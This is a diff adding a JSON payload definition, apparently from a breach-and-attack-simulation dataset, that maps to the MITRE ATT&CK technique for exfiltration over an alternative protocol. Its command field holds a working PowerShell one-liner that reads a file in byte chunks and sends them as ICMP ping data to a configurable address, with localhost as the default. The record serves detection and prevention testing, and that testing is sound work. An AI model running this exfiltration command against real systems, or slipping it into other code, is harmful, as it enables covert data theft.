@@ -1,0 +1,180 @@
+{
+  "data" : {
+    "id" : "9370b76d-c1de-48e8-9b0c-16414e300354",
+    "type" : "command",
+    "attributes" : {
+      "payload_type" : "Command",
+      "command_executor" : "psh",
+      "command_content" : "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n",
+      "payload_id" : "9370b76d-c1de-48e8-9b0c-16414e300354",
+      "payload_name" : "Exfiltration Over Alternative Protocol - ICMP",
+      "payload_description" : "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
+      "payload_platforms" : [ "Windows" ],
+      "payload_cleanup_executor" : null,
+      "payload_cleanup_command" : null,
+      "payload_elevation_required" : false,
+      "payload_arguments" : [ {
+        "type" : "text",
+        "key" : "input_file",
+        "default_value" : "C:\\Windows\\System32\\notepad.exe",
+        "description" : null,
+        "separator" : null
+      }, {
+        "type" : "text",
+        "key" : "ip_address",
+        "default_value" : "127.0.0.1",
+        "description" : null,
+        "separator" : null
+      } ],
+      "payload_prerequisites" : [ ],
+      "payload_external_id" : "16e5f26d-e92f-4a2f-8894-abbf29087153",
+      "payload_source" : "FILIGRAN",
+      "payload_expectations" : [ "PREVENTION", "DETECTION" ],
+      "payload_status" : "VERIFIED",
+      "payload_execution_arch" : "ALL_ARCHITECTURES",
+      "payload_created_at" : "2025-07-30T06:24:33.794113Z",
+      "payload_updated_at" : "2026-05-19T13:05:00.117600Z"
+    },
+    "relationships" : {
+      "payload_attack_patterns" : {
+        "data" : [ {
+          "id" : "bbc76d1b-918d-4eb7-8a43-ee0c3133c0bb",
+          "type" : "attack_patterns"
+        } ]
+      },
+      "payload_tags" : {
+        "data" : [ {
+          "id" : "690e69a9-d229-4a6d-a0cd-ead2747153aa",
+          "type" : "tags"
+        }, {
+          "id" : "13269285-08b1-423e-8ca2-1bc3553c9408",
+          "type" : "tags"
+        } ]
+      },
+      "payload_domains" : {
+        "data" : [ {
+          "id" : "28567513-3d69-4411-a825-802beb8948cc",
+          "type" : "domains"
+        }, {
+          "id" : "0f9dd86d-3f23-4d6a-bfef-11d80fc9766c",
+          "type" : "domains"
+        }, {
+          "id" : "ff033435-8631-4c7b-9ed8-178b34011e65",
+          "type" : "domains"
+        } ]
+      }
+    }
+  },
+  "included" : [ {
+    "id" : "2dfebffe-e2dd-4324-bd0c-2b1cb5408d0b",
+    "type" : "kill_chain_phases",
+    "attributes" : {
+      "phase_id" : "2dfebffe-e2dd-4324-bd0c-2b1cb5408d0b",
+      "phase_external_id" : "TA0010",
+      "phase_stix_id" : "x-mitre-tactic--9a4e74ab-5008-408c-84bf-a10dfbc53462",
+      "phase_name" : "Exfiltration",
+      "phase_shortname" : "exfiltration",
+      "phase_kill_chain_name" : "mitre-attack",
+      "phase_description" : "The adversary is trying to steal data.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.",
+      "phase_order" : 12,
+      "phase_created_at" : "2025-07-22T13:40:49.929298Z",
+      "phase_updated_at" : "2025-07-22T13:40:49.929299Z"
+    }
+  }, {
+    "id" : "6e40d76d-6c21-4281-9704-f728866ff35c",
+    "type" : "attack_patterns",
+    "attributes" : {
+      "attack_pattern_id" : "6e40d76d-6c21-4281-9704-f728866ff35c",
+      "attack_pattern_stix_id" : "attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776",
+      "attack_pattern_name" : "Exfiltration Over Alternative Protocol",
+      "attack_pattern_description" : "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).",
+      "attack_pattern_external_id" : "T1048",
+      "attack_pattern_platforms" : [ "ESXi", "IaaS", "Linux", "macOS", "Network Devices", "Office Suite", "SaaS", "Windows" ],
+      "attack_pattern_permissions_required" : [ ],
+      "attack_pattern_created_at" : "2025-07-22T13:40:50.760141Z",
+      "attack_pattern_updated_at" : "2026-04-28T08:40:48.980402Z"
+    },
+    "relationships" : {
+      "attack_pattern_kill_chain_phases" : {
+        "data" : [ {
+          "id" : "2dfebffe-e2dd-4324-bd0c-2b1cb5408d0b",
+          "type" : "kill_chain_phases"
+        } ]
+      }
+    }
+  }, {
+    "id" : "bbc76d1b-918d-4eb7-8a43-ee0c3133c0bb",
+    "type" : "attack_patterns",
+    "attributes" : {
+      "attack_pattern_id" : "bbc76d1b-918d-4eb7-8a43-ee0c3133c0bb",
+      "attack_pattern_stix_id" : "attack-pattern--be72481a-b46e-48da-8c33-2cdd510d38e3",
+      "attack_pattern_name" : "Exfiltration Over Unencrypted Non-C2 Protocol",
+      "attack_pattern_description" : "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",
+      "attack_pattern_external_id" : "T1048.003",
+      "attack_pattern_platforms" : [ ],
+      "attack_pattern_permissions_required" : [ ],
+      "attack_pattern_created_at" : "2025-07-22T13:40:55.153454Z",
+      "attack_pattern_updated_at" : "2026-05-19T13:05:00.076338Z"
+    },
+    "relationships" : {
+      "attack_pattern_parent" : {
+        "data" : {
+          "id" : "6e40d76d-6c21-4281-9704-f728866ff35c",
+          "type" : "attack_patterns"
+        }
+      },
+      "attack_pattern_kill_chain_phases" : {
+        "data" : [ {
+          "id" : "2dfebffe-e2dd-4324-bd0c-2b1cb5408d0b",
+          "type" : "kill_chain_phases"
+        } ]
+      }
+    }
+  }, {
+    "id" : "690e69a9-d229-4a6d-a0cd-ead2747153aa",
+    "type" : "tags",
+    "attributes" : {
+      "tag_id" : "690e69a9-d229-4a6d-a0cd-ead2747153aa",
+      "tag_name" : "type:native",
+      "tag_color" : "#10b981"
+    }
+  }, {
+    "id" : "13269285-08b1-423e-8ca2-1bc3553c9408",
+    "type" : "tags",
+    "attributes" : {
+      "tag_id" : "13269285-08b1-423e-8ca2-1bc3553c9408",
+      "tag_name" : "source:openaev-datasets",
+      "tag_color" : "#ef4444"
+    }
+  }, {
+    "id" : "28567513-3d69-4411-a825-802beb8948cc",
+    "type" : "domains",
+    "attributes" : {
+      "domain_id" : "28567513-3d69-4411-a825-802beb8948cc",
+      "domain_name" : "Data Exfiltration",
+      "domain_color" : "#9933CC",
+      "domain_created_at" : "2026-02-06T08:50:48.372475Z",
+      "domain_updated_at" : "2026-02-06T08:50:48.372475Z"
+    }
+  }, {
+    "id" : "0f9dd86d-3f23-4d6a-bfef-11d80fc9766c",
+    "type" : "domains",
+    "attributes" : {
+      "domain_id" : "0f9dd86d-3f23-4d6a-bfef-11d80fc9766c",
+      "domain_name" : "Endpoint",
+      "domain_color" : "#389CFF",
+      "domain_created_at" : "2026-02-06T08:50:48.372475Z",
+      "domain_updated_at" : "2026-02-06T08:50:48.372475Z"
+    }
+  }, {
+    "id" : "ff033435-8631-4c7b-9ed8-178b34011e65",
+    "type" : "domains",
+    "attributes" : {
+      "domain_id" : "ff033435-8631-4c7b-9ed8-178b34011e65",
+      "domain_name" : "Network",
+      "domain_color" : "#009933",
+      "domain_created_at" : "2026-02-06T08:50:48.372475Z",
+      "domain_updated_at" : "2026-02-06T08:50:48.372475Z"
+    }
+  } ]
+}
